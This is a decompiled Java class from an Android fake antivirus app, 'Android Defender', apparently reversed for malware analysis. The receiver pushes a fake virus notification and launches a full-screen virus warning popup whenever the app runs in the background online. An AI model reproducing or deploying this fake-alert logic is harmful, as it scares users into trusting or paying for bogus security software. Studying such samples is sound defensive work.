package com.worker.androiddefender2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import com.example.androiddefender2.DefenderApplication;
import com.example.androiddefender2.VirusInfoDialogActivity;

public class NetworkAlarm extends BroadcastReceiver {
  public int versionSygnal = 1;
  
  private void getBytesSignal() {
    this.versionSygnal = DefenderApplication.getInstance().getSharedPreferences(DefenderApplication.APP_PREF, 0).getInt("versionSygnal", 1);
  }
  
  private void saveBytesSignal(int paramInt) {
    SharedPreferences.Editor editor = DefenderApplication.getInstance().getSharedPreferences(DefenderApplication.APP_PREF, 0).edit();
    editor.putInt("versionSygnal", paramInt);
    editor.commit();
  }
  
  public void onReceive(Context paramContext, Intent paramIntent) {
    if (DefenderApplication.getInstance().isOnline() && DefenderApplication.getInstance().isApplicationBroughtToBackground()) {
      DefenderApplication.getInstance();
      boolean bool = paramContext.getSharedPreferences(DefenderApplication.APP_PREF, 0).getBoolean("chkMessages", false);
      if ((DefenderApplication.getInstance()).virusesDefine && bool && (DefenderApplication.getInstance()).indexesVr.size() > 0) {
        DefenderApplication.getInstance();
        if (!DefenderApplication.isCurAutoScan) {
          (new SystemFunctions()).generateNotification(paramContext, "Android Defender", DefenderApplication.getInstance().getResources().getString(2131099786));
          paramIntent = new Intent(paramContext, VirusInfoDialogActivity.class);
          paramIntent.addFlags(268435456);
          paramIntent.putExtra("typePopup", 4);
          paramContext.startActivity(paramIntent);
        } 
      } 
    } 
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/NetworkAlarm.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */